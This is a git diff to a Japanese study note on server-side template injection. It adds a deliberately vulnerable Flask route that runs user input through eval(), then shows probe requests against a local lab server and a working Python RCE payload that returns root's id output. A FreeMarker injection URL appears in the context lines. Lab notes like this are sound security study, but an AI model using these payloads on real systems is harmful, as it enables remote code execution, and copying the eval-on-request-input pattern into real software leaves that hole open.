@@ -11,8 +11,6 @@
       - [smarty](#smarty)
       - [twig](#twig)
     - [Java](#java)
-      - [velocity](#velocity)
-      - [freemarker](#freemarker)
     - [python](#python)
     - [Ruby](#ruby)
     - [Node.js](#nodejs)
@@ -372,6 +370,49 @@ http://192.168.99.100:15003/freemarker?inj=%3C%23assign+ex%3D%22freemarker.templ
 e364a20a-dc6a-4ffe-9c3a-3a160d2f1a87 uid=0(root) gid=0(root) groups=0(root) 7820f0ba-f134-4991-bc75-2ad40f687839
 ```
 ### python
+#### eval
+```python
+@app.route("/reflect/<engine>")
+def reflect(engine):
+
+    template = request.values.get('tpl')
+    if not template:
+        template = '%s'
+
+    injection = request.values.get('inj')
+
+    if engine == 'mako':
+        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
+    elif engine == 'jinja2':
+        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
+    elif engine == 'eval':
+        return randomword() + str(eval(template % injection)) + randomword()
+    elif engine == 'tornado':
+        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
+```
+ここらへんはダメ。まあテンプレートエンジンで解析してるわけじゃないから当たり前だけど。   
+```txt
+http://192.168.99.100:15001/reflect/eval?inj=*
+Internal Server Error
+
+http://192.168.99.100:15001/reflect/eval?inj='***'
+wkntaemr***sbfrnopf
+
+http://192.168.99.100:15001/reflect/eval?inj=${7*7}
+Internal Server Error
+
+http://192.168.99.100:15001/reflect/eval?inj={{7*7}}
+Internal Server Error
+```
+以下でRCEできる！参考は以下。まだ動くPayloadありそう？   
+https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html   
+```txt
+http://192.168.99.100:15001/reflect/eval?inj=__import__(%27os%27).popen(%27id%27).read()
+cezfkidwuid=0(root) gid=0(root) groups=0(root) govhugaq
+```
+#### mako
+#### jinja2
+#### tornado
 ### Ruby
 ### Node.js
 
